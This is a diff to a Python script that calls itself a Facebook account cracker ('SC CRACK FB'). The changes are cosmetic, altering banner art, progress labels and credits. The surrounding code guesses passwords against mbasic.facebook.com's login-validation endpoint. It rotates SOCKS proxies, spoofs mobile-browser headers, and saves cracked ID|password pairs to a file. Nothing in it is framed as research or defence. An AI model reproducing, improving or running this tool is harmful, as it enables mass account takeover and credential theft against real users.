@@ -500,14 +500,14 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	    cetak(nel(f"""\x1b[1;91m
-\x1b[1;91m.::!!!!!!!:.
-\x1b[1;91m  .!!!!!:.                        .:!!!!!!!!!!!!
-\x1b[1;91m  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
-\x1b[1;91m      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
-\x1b[1;91m      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
-\x1b[1;97m      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
-\x1b[1;97m      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
-\x1b[1;97m        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+\x1b[1;91m   .::!!!!!!!:.
+\x1b[1;91m      .!!!!!:.                      .:!!!!!!!!!!!!
+\x1b[1;91m      ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+\x1b[1;91m          :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+\x1b[1;91m          $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+\x1b[1;97m          $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+\x1b[1;97m          ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+\x1b[1;97m            "*$bd$$$$      '*$$$$$$$$$$$o+#"
               """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -915,7 +915,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r SYAH>_ {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r[MOBILE] {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks4://'+nip}
@@ -955,7 +955,7 @@ def crack(idf,pwv):
 def crackfree(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r└──>[SYAH] {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r[MBASIC] {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
@@ -970,7 +970,7 @@ def crackfree(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r└── ID  : {K}{idf}{P}          \n│   └──  PASSWORD  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
+				print(f'\r└── ID  : {K}{idf}{P}          \n│   └──  PASSWORD  : {K}{pw}          {P}\n└── USER AGENT  : {M}{ua}{M}           \n')
 				open('PPKCP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1003,8 +1003,8 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	ilman(f'\n\t {h}HALO INI SCRIPT SYAH X FORCE, GW RECOD Zr-X :>{x} ')
-	time.sleep(3)
+	ilman(f'\n\t {h}INI SC CRACK FB BY : Zr-X :>{x} ')
+	time.sleep(5)
 	login()
 	
 #SYAH X FORCE
